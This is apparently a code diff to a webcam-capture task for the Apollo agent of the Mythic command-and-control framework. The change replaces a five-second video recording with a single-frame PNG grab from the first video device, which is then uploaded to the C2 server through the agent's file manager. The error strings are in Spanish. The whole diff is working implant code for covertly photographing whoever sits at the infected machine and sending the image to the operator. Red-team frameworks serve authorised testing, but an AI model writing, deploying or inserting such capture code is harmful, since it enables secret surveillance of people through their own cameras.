@@ -15,12 +15,10 @@ using System.Windows.Forms;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Threading;
 using System.Threading.Tasks;
 using ApolloInterop.Utils;
 using AForge.Video;
 using AForge.Video.DirectShow;
-using AForge.Video.FFMPEG;
 
 namespace Tasks
 {
@@ -34,8 +32,6 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp = CreateTaskResponse("", true);
-            string tempFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.avi");
-
             try
             {
                 var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
@@ -47,29 +43,21 @@ namespace Tasks
 
                 var tcs = new TaskCompletionSource<byte[]>();
                 var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
-                var writer = new VideoFileWriter();
-                bool recording = true;
 
                 videoSource.NewFrame += (sender, eventArgs) =>
                 {
-                    if (!writer.IsOpen)
-                    {
-                        writer.Open(tempFile, eventArgs.Frame.Width, eventArgs.Frame.Height, 25, VideoCodec.MPEG4);
-                    }
-                    writer.WriteVideoFrame((Bitmap)eventArgs.Frame.Clone());
+                    using Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
+                    using MemoryStream ms = new();
+                    bitmap.Save(ms, ImageFormat.Png);
+                    tcs.TrySetResult(ms.ToArray());
+                    videoSource.SignalToStop();
                 };
 
                 videoSource.Start();
 
-                Thread.Sleep(5000);
-                recording = false;
-                videoSource.SignalToStop();
-                videoSource.WaitForStop();
-                writer.Close();
+                byte[] imageBytes = tcs.Task.GetAwaiter().GetResult();
 
-                byte[] videoBytes = File.ReadAllBytes(tempFile);
-
-                bool result = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, videoBytes, null, out string mythicFileId, true);
+                bool result = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, imageBytes, null, out string mythicFileId, true);
                 if (!result)
                 {
                     _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("Error al guardar el archivo en Mythic", true, "error"));
@@ -83,10 +71,6 @@ namespace Tasks
             catch (Exception ex)
             {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(ex.Message, true, "error"));
-            }
-            finally
-            {
-                if (File.Exists(tempFile)) File.Delete(tempFile);
             }
         }
     }
